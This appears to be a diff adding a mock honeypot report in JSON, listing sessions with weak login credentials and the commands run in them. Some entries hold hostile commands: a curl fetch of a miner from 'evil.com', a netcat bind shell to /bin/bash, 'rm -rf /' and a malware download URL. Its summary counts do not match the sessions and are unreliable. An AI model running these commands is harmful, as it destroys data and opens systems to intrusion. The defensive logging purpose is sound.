@@ -1,0 +1,304 @@
+{
+  "metadata": {
+    "report_date": "20250526T02:57:20.436835",
+    "analysis_period": {
+      "start": "2025-05-26T00:00:00+00:00",
+      "end": "2025-05-26T23:59:59+00:00"
+    }
+  },
+  "statistics": {
+    "total_sessions": 13,
+    "unique_ips": 5
+  },
+  "top_ips": [
+    {
+      "ip": "185.228.168.9",
+      "count": 6
+    },
+    {
+      "ip": "77.88.8.8",
+      "count": 3
+    },
+    {
+      "ip": "114.114.114.114",
+      "count": 2
+    },
+    {
+      "ip": "1.1.1.1",
+      "count": 1
+    },
+    {
+      "ip": "203.0.113.1",
+      "count": 1
+    }
+  ],
+  "dangerous_commands": [
+    {
+      "command": "curl -O http://evil.com/miner",
+      "count": 3
+    },
+    {
+      "command": "rm -rf /",
+      "count": 4
+    }
+  ],
+  "session_details": {
+    "mock00000000": {
+      "ip": "1.1.1.1",
+      "timestamp": "2025-05-26T14:21:46.000000Z",
+      "login": {
+        "username": "postgres",
+        "password": "qwerty",
+        "status": "success"
+      },
+      "commands": [
+        "ls",
+        "free",
+        "pwd",
+        "whoami",
+        "whoami",
+        "top",
+        "ps",
+        "free",
+        "id",
+        "top"
+      ],
+      "dangerous_commands": [],
+      "downloads": []
+    },
+    "mock00000001": {
+      "ip": "203.0.113.1",
+      "timestamp": "2025-05-26T04:56:03.000000Z",
+      "login": {
+        "username": "mysql",
+        "password": "root",
+        "status": "success"
+      },
+      "commands": [
+        "free",
+        "id",
+        "uptime",
+        "nc -l -p 4444 -e /bin/bash"
+      ],
+      "dangerous_commands": [
+        "nc -l -p 4444 -e /bin/bash"
+      ],
+      "downloads": []
+    },
+    "mock00000002": {
+      "ip": "114.114.114.114",
+      "timestamp": "2025-05-26T06:24:25.000000Z",
+      "login": {
+        "username": "postgres",
+        "password": "123456",
+        "status": "failed"
+      },
+      "commands": [
+        "free"
+      ],
+      "dangerous_commands": [],
+      "downloads": [
+        {
+          "url": "http://malicious-site4.com/malware.sh",
+          "filename": "malware58.sh"
+        }
+      ]
+    },
+    "mock00000003": {
+      "ip": "114.114.114.114",
+      "timestamp": "2025-05-26T13:36:03.000000Z",
+      "login": {
+        "username": "ubuntu",
+        "password": "root",
+        "status": "success"
+      },
+      "commands": [
+        "cat /etc/passwd"
+      ],
+      "dangerous_commands": [],
+      "downloads": []
+    },
+    "mock00000004": {
+      "ip": "185.228.168.9",
+      "timestamp": "2025-05-26T10:16:50.000000Z",
+      "login": {
+        "username": "mysql",
+        "password": "admin",
+        "status": "success"
+      },
+      "commands": [
+        "id",
+        "top",
+        "cat /etc/passwd",
+        "top",
+        "uptime",
+        "ls",
+        "ps",
+        "uname -a",
+        "ps",
+        "curl -O http://evil.com/miner"
+      ],
+      "dangerous_commands": [
+        "curl -O http://evil.com/miner"
+      ],
+      "downloads": []
+    },
+    "mock00000005": {
+      "ip": "185.228.168.9",
+      "timestamp": "2025-05-26T06:04:31.000000Z",
+      "login": {
+        "username": "user",
+        "password": "123",
+        "status": "success"
+      },
+      "commands": [
+        "free",
+        "ls",
+        "whoami",
+        "uptime",
+        "pwd"
+      ],
+      "dangerous_commands": [],
+      "downloads": []
+    },
+    "mock00000006": {
+      "ip": "185.228.168.9",
+      "timestamp": "2025-05-26T12:07:48.000000Z",
+      "login": {
+        "username": "user",
+        "password": "123456",
+        "status": "success"
+      },
+      "commands": [
+        "ls",
+        "id",
+        "uname -a",
+        "pwd",
+        "ps",
+        "top",
+        "ps",
+        "id",
+        "uptime",
+        "uptime"
+      ],
+      "dangerous_commands": [],
+      "downloads": []
+    },
+    "mock00000007": {
+      "ip": "185.228.168.9",
+      "timestamp": "2025-05-26T13:42:43.000000Z",
+      "login": {
+        "username": "root",
+        "password": "123456",
+        "status": "failed"
+      },
+      "commands": [
+        "top",
+        "free",
+        "ls",
+        "free",
+        "ls",
+        "whoami"
+      ],
+      "dangerous_commands": [],
+      "downloads": []
+    },
+    "mock00000008": {
+      "ip": "185.228.168.9",
+      "timestamp": "2025-05-26T11:09:08.000000Z",
+      "login": {
+        "username": "root",
+        "password": "123456",
+        "status": "failed"
+      },
+      "commands": [
+        "uptime",
+        "df",
+        "ls",
+        "id",
+        "ps",
+        "top"
+      ],
+      "dangerous_commands": [],
+      "downloads": []
+    },
+    "mock00000009": {
+      "ip": "185.228.168.9",
+      "timestamp": "2025-05-26T16:29:50.000000Z",
+      "login": {
+        "username": "admin",
+        "password": "12345",
+        "status": "failed"
+      },
+      "commands": [
+        "pwd",
+        "uptime",
+        "uname -a",
+        "df",
+        "id",
+        "uptime"
+      ],
+      "dangerous_commands": [],
+      "downloads": []
+    },
+    "mock0000000a": {
+      "ip": "77.88.8.8",
+      "timestamp": "2025-05-26T20:25:46.000000Z",
+      "login": {
+        "username": "centos",
+        "password": "password",
+        "status": "success"
+      },
+      "commands": [
+        "free",
+        "ps",
+        "ls",
+        "uptime",
+        "ps",
+        "df",
+        "whoami",
+        "top",
+        "uname -a",
+        "pwd",
+        "python -c \"import os; os.system('rm -rf /')\""
+      ],
+      "dangerous_commands": [
+        "python -c \"import os; os.system('rm -rf /')\""
+      ],
+      "downloads": []
+    },
+    "mock0000000b": {
+      "ip": "77.88.8.8",
+      "timestamp": "2025-05-26T19:53:52.000000Z",
+      "login": {
+        "username": "ubuntu",
+        "password": "12345",
+        "status": "success"
+      },
+      "commands": [
+        "free",
+        "ls",
+        "whoami",
+        "pwd"
+      ],
+      "dangerous_commands": [],
+      "downloads": []
+    },
+    "mock0000000c": {
+      "ip": "77.88.8.8",
+      "timestamp": "2025-05-26T05:37:44.000000Z",
+      "login": {
+        "username": "ubuntu",
+        "password": "admin",
+        "status": "failed"
+      },
+      "commands": [
+        "top",
+        "ls",
+        "cat /etc/passwd"
+      ],
+      "dangerous_commands": [],
+      "downloads": []
+    }
+  }
+}
